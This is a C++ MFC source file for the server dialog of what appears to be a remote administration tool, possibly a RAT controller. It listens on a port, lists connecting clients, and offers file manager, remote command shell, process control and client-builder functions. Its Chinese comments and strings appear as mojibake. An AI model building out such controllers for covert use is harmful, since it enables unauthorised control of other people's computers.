
// ServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#include "Build.h"
#include <mmsystem.h>
#pragma comment(lib,"WINMM.LIB")
#ifdef _DEBUG
#define new DEBUG_NEW
#define ID_FILE_MANAGER 1001
#define ID_CONFIG       1008
#define ID_CMD          1003
#define ID_TASK         1004
#define ID_BUILD        1007
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
public:
	//afx_msg void OnFileRefresh();
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	//ON_COMMAND(ID_FILE_32779, &CAboutDlg::OnFileRefresh)
END_MESSAGE_MAP()


// CServerDlg �Ի���



CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDI_MAINFRAME);
	this->m_port = 8050;
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_MESSAGE(ID_ONLINE, OnAddHost)
	ON_MESSAGE(ID_OFFLINE, OnOffLine)
	ON_WM_CLOSE()
	ON_COMMAND(ID_FILE_MANAGER, OnFileManager)
	ON_COMMAND(ID_CONFIG,OnConfig)
	ON_COMMAND(ID_CMD,OnCmdShell)
	ON_COMMAND(ID_TASK,OnTask)
	ON_COMMAND(ID_BUILD,OnBuild)
END_MESSAGE_MAP()


// CServerDlg ��Ϣ�������

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO:  �ڴ���Ӷ���ĳ�ʼ������
	this->m_config = NULL;
	this->ReadConfig();
	this->UpdateMain(this->m_port);

	::CloseHandle(CreateThread(0, 0, OninitSocket, (LPVOID)this, 0, 0)); //�����߳�

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CServerDlg::UpdateMain(int port)
{
	m_port = port;
	m_imagelist.Create(32, 32, ILC_COLOR24 | ILC_MASK, 1, 1);
	CBitmap bmp;
	for (int i = 0; i<9; i++)
	{
		bmp.LoadBitmapW(IDB_BITMAP1 + i);
		m_imagelist.Add(&bmp, RGB(255, 255, 255));
		bmp.DeleteObject();
	}

	const UINT t[10] = { 1001, 1002, 1003, 1004, 1005, 1006, 0, 1007, 1008,1009 };
	m_toolbar.CreateEx(this);
	m_toolbar.SetButtons(t, 10);
	m_toolbar.SetSizes(CSize(60, 56), CSize(24, 24));
	m_toolbar.SetButtonText(0, _T("�ļ�����"));
	m_toolbar.SetButtonText(1, _T("��Ļ���"));
	m_toolbar.SetButtonText(2, _T("�����ն�"));
	m_toolbar.SetButtonText(3, _T("���̹���"));
	m_toolbar.SetButtonText(4, _T("�������"));
	m_toolbar.SetButtonText(5, _T("ж������"));
	m_toolbar.SetButtonText(7, _T("���ɿͻ�"));
	m_toolbar.SetButtonText(8, _T("��������"));
	m_toolbar.SetButtonText(9, _T("�������"));
	m_toolbar.GetToolBarCtrl().SetImageList(&m_imagelist);

	BOOL hbar = m_statusbar.Create(this);
	UINT b[2] = { 1009, 1010 };
	hbar = m_statusbar.SetIndicators(b, 2);
	m_statusbar.SetPaneInfo(0, b[0], SBPS_NORMAL, 400);
	m_statusbar.SetPaneInfo(1, b[1], SBPS_NORMAL, 180);
	CString ListemPort;
	ListemPort.Format(_T("�����˿ڣ�%d"), port);
	m_statusbar.SetPaneText(0, ListemPort);
	m_statusbar.SetPaneText(1, _T("����������0 ̨"));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);

	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);
	m_list.InsertColumn(0, _T("����λ��"), LVCFMT_LEFT, 160);
	m_list.InsertColumn(1, _T("IP��ַ"), LVCFMT_LEFT, 110);
	m_list.InsertColumn(2, _T("����ϵͳ"), LVCFMT_LEFT, 90);
	m_list.InsertColumn(3, _T("����״̬"), LVCFMT_LEFT, 60);
	m_list.InsertColumn(4, _T("����˰汾��"), LVCFMT_LEFT, 100);

	GetClientRect(&m_rect);

}



BOOL CServerDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO:  �ڴ����ר�ô����/����û���
	if (pMsg->message == WM_KEYDOWN)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (nVirtKey == VK_RETURN || nVirtKey == VK_ESCAPE)
		{
			return TRUE;
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO:  �ڴ˴������Ϣ����������
	if (nType == SIZE_MINIMIZED)
	{
		return;
	}
	CWnd *pWnd;
	pWnd = GetDlgItem(IDC_LIST1);     //��ȡ�ؼ����
	if (pWnd)//�ж��Ƿ�Ϊ�գ���Ϊ�Ի��򴴽�ʱ����ô˺���������ʱ�ؼ���δ����
	{
		CRect rect, rect_l;   //��ȡ�ؼ��仯ǰ��С
		GetClientRect(&rect_l);
		pWnd->GetWindowRect(&rect);
		ScreenToClient(&rect);
		rect.right = cx;
		rect.bottom = rect.bottom + (rect_l.bottom - m_rect.bottom);
		pWnd->MoveWindow(rect);//���ÿؼ���С
		RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
	}
	GetClientRect(&m_rect);
}

DWORD WINAPI CServerDlg::OninitSocket(LPVOID self) //��ʼ��Socket�߳�
{
	CServerDlg* t = (CServerDlg*)self;
	t->InitSocket();
	return 0;
}
bool CServerDlg::InitSocket()
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2, 2), &WSAData);
	SOCKADDR_IN saddr;

	s = ::socket(AF_INET, SOCK_STREAM, 0);
	if (s == SOCKET_ERROR)
	{
		MessageBox(_T("��������ʧ��"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		return false;
	}

	saddr.sin_family = AF_INET;
	saddr.sin_addr.S_un.S_addr = INADDR_ANY;
	saddr.sin_port = htons(this->m_port);

	int nRet;
	//MessageBox(_T("bind().."), _T("��ʾ"), MB_OK | MB_ICONWARNING);
	nRet = ::bind(s, (SOCKADDR *)&saddr, sizeof(SOCKADDR));
	if (nRet == SOCKET_ERROR)
	{
		CString err;
		DWORD ERR = GetLastError();
		err.Format(L"�󶨶˿�ʧ��:%d", ERR);
		MessageBox(err, _T("��ʾ"), MB_OK | MB_ICONWARNING);



		return false;
	}

	nRet = listen(s, m_max);
	if (nRet == SOCKET_ERROR)
	{
		MessageBox(_T("�����˿�ʧ��"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		return false;
	}
	MessageBox(_T("Server is ready..."), _T("��ʾ"), MB_OK | MB_ICONWARNING);
	while (1)
	{
		SOCKET ClientSock;
		SOCKADDR_IN ClientAddr;
		int ClientAddrsize = sizeof(SOCKADDR);

		//MessageBox(_T("waiting to accept.."), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		ClientSock = accept(s, (sockaddr *)&ClientAddr, &ClientAddrsize);
		if (ClientSock == INVALID_SOCKET)
		{
			continue;
		}
		//MessageBox(_T("Accpt successfully"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		AddHost(ClientSock, ClientAddr);
	}
	return true;
}

void CServerDlg::GetNewItemData(SOCKET sock, SOCKADDR_IN addr)
{
	CItemData *item;
	int id;
	int Count = m_list.GetItemCount();
	if (Count == 0)
	{
		id = 0;
	}
	else
	{
		id = 0;
		for (int i = 0; i<Count; i++)
		{
			item = (CItemData*)m_list.GetItemData(i);
			if (item->m_id == id)
			{
				i = 0;
				id = id + 1;
				continue;
			}
		}
	}
	item = NULL;
	item = new CItemData(id, sock, &addr, this->m_hWnd);
	item->Run();
}
void CServerDlg::AddHost(SOCKET sock, SOCKADDR_IN addr)
{
	GetNewItemData(sock, addr);
	return;
}

LRESULT  CServerDlg::OnAddHost(WPARAM wparam, LPARAM lparam) //����������Ϣ��
{
	CItemData *t = (CItemData*)wparam;
	int i = m_list.GetItemCount();
	m_list.InsertItem(i, t->m_Address, 0);
	m_list.SetItemText(i, 1, t->m_IP);
	m_list.SetItemText(i, 2, t->m_OS);
	m_list.SetItemText(i, 3, _T("δ����"));
	m_list.SetItemText(i, 4, t->m_Ver);
	m_list.SetItemData(i, (DWORD)t);

	ShowOnLine();
	if (m_sound == 1)
	{
		PlaySoundW(_T("Sound\\online.wav"), 0, SND_FILENAME | SND_ASYNC);
	}
	return TRUE;
}
/*
���ܣ��Կͻ���������Ϣ��Ӧ
������
*/
LRESULT   CServerDlg::OnOffLine(WPARAM wparam, LPARAM lparam) //����������Ϣ��
{
	CItemData* t;
	for (int i = 0; i<m_list.GetItemCount(); i++)
	{
		t = (CItemData*)m_list.GetItemData(i);
		if (t->m_id == (int)wparam)
		{
			::closesocket(t->GetSocket());
			delete t;
			m_list.DeleteItem(i);
		}
	}
	ShowOnLine();
	if (m_sound == 1)
	{
		PlaySoundW(_T("Sound\\offline.wav"), 0, SND_FILENAME | SND_ASYNC);
	}
	return TRUE;
}

void  CServerDlg::ShowOnLine()
{
	int c = m_list.GetItemCount();
	CString online;
	TCHAR* szText;
	online.Format(_T("����������%d ̨"), c);
	szText = online.GetBuffer(online.GetLength());
	::SendMessageW(m_statusbar, SB_SETTEXTW, (WPARAM)1, (LPARAM)szText);
	online.ReleaseBuffer();
}


void CServerDlg::OnClose()
{
	// TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
	int t = MessageBoxW(_T("ȷ��Ҫ�˳�������"), _T("��ʾ"), MB_YESNO | MB_ICONINFORMATION);
	if (t == IDYES)
	{
		//CloseAllSocket();
		::closesocket(s);
		m_Mysock.Clean();
	}
	else
	{
		return;
	}

	CDialogEx::OnClose();
}

void CServerDlg::OnFileManager()
{
	CItemData *t;
	t = GetSelItemInfo();
	if (t == NULL)
	{
		return;
	}
	else
	{
		t->RunToFileManager();
	}
}
void CServerDlg::OnCmdShell()
{
	CItemData *t;
	t = GetSelItemInfo();
	if (t == NULL)
	{
		return;
	}
	else
	{
		t->RunToCmdShell();
	}
}
CItemData* CServerDlg::GetSelItemInfo()
{
	POSITION pos_s;
	pos_s = m_list.GetFirstSelectedItemPosition();
	if (!pos_s)
	{
		return NULL;
	}
	int item = m_list.GetNextSelectedItem(pos_s);
	CItemData *t;
	t = (CItemData*)m_list.GetItemData(item);
	return t;
}

void CServerDlg::OnConfig()
{
	if (m_config == NULL)
	{
		m_config = new CConfigDlg(this);
		m_config->Create(IDD_CONFIG_DLG, this);
		m_config->ShowWindow(SW_NORMAL);
	}
	else
		m_config->SetActiveWindow();
}
void CServerDlg::OnTask()
{
	CItemData *t;
	t = GetSelItemInfo();
	if (t == NULL)
	{
		return;
	}
	else
	{
		t->RunToTask();
	}
}

void CServerDlg::OnBuild()
{
	CBuild dlg;
	dlg.DoModal();

}
bool CServerDlg::ReadConfig()
{
	CString port;
	CString max;
	CString sound;

	CString  strPath;
	GetModuleFileName(NULL, strPath.GetBufferSetLength(MAX_PATH + 1), MAX_PATH);
	strPath.ReleaseBuffer();
	int nPos;
	nPos = strPath.ReverseFind('\\');
	strPath = strPath.Left(nPos);
	strPath += "\\config.ini";

	GetPrivateProfileString(L"Config", L"port", L"8000", port.GetBuffer(MAX_PATH), MAX_PATH, strPath);
	GetPrivateProfileString(L"Config", L"sound", L"0", sound.GetBuffer(MAX_PATH), MAX_PATH, strPath);
	GetPrivateProfileString(L"Config", L"max", L"5", max.GetBuffer(MAX_PATH), MAX_PATH, strPath);

	this->m_port = _ttoi(port);
	this->m_sound = _ttoi(sound);
	this->m_max = _ttoi(max);

	return true;
}



